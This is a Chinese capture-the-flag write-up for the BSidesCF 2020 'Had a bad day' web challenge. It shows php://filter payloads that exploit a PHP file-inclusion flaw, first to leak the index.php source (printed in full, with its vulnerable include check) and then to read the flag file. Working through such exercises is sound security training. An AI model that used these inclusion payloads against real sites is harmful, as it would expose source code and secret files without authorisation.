# 原创
：  [BSidesCF 2020]Had a bad day

# [BSidesCF 2020]Had a bad day

#### [BSidesCF 2020]Had a bad day

## 考点

> 
文件包含


## 思路

> 
观察URL：`http://a88b9b8c-25f9-450b-886e-13f241092165.node3.buuoj.cn/index.php?category=meowers`，尝试sql注入测试发现没有效果，报错显示为文件包含知识点，直接访问其他文件没有用，先用伪协议读取 `index.php`源码，再读取flag


## Payload

> 
Payload 读取 index.php：`?category=php://filter/read=convert.base64-encode/resource=index`


```
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
    &lt;meta name="description" content="Images that spark joy"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0"&gt;
    &lt;title&gt;Had a bad day?&lt;/title&gt;
    &lt;link rel="stylesheet" href="css/material.min.css"&gt;
    &lt;link rel="stylesheet" href="css/style.css"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100"&gt;
      &lt;header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800"&gt;
        &lt;div class="mdl-layout__header-row"&gt;
          &lt;span class="mdl-layout-title"&gt;Had a bad day?&lt;/span&gt;
          &lt;div class="mdl-layout-spacer"&gt;&lt;/div&gt;
        &lt;div&gt;
      &lt;/header&gt;
      &lt;div class="page-ribbon"&gt;&lt;/div&gt;
      &lt;main class="page-main mdl-layout__content"&gt;
        &lt;div class="page-container mdl-grid"&gt;
          &lt;div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"&gt;&lt;/div&gt;
          &lt;div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col"&gt;
            &lt;div class="page-crumbs mdl-color-text--grey-500"&gt;
            &lt;/div&gt;
            &lt;h3&gt;Cheer up!&lt;/h3&gt;
              &lt;p&gt;
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              &lt;/p&gt;
              &lt;div class="page-include"&gt;
              &lt;?php
                                $file = $_GET['category'];

                                if(isset($file))
                                {
                                        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
                                                include ($file . '.php');
                                        }
                                        else{
                                                echo "Sorry, we currently only support woofers and meowers.";
                                        }
                                }
                                ?&gt;
                        &lt;/div&gt;
          &lt;form action="index.php" method="get" id="choice"&gt;
              &lt;center&gt;&lt;button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple"&gt;Woofers&lt;span class="mdl-button__ripple-container"&gt;&lt;span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
              &lt;button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple"&gt;Meowers&lt;span class="mdl-button__ripple-container"&gt;&lt;span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
          &lt;/form&gt;

          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/main&gt;
    &lt;/div&gt;
    &lt;script src="js/material.min.js"&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;

```

> 
由于只是验证了变量category值中是否有index或者woofers或者meowers，构造Payload：<br/> `php://filter/read=convert.base64-encode/index/resource=flag`<br/> `php://filter/read=convert.base64-encode/woofers/resource=flag`<br/> `php://filter/read=convert.base64-encode/meowers/resource=flag`

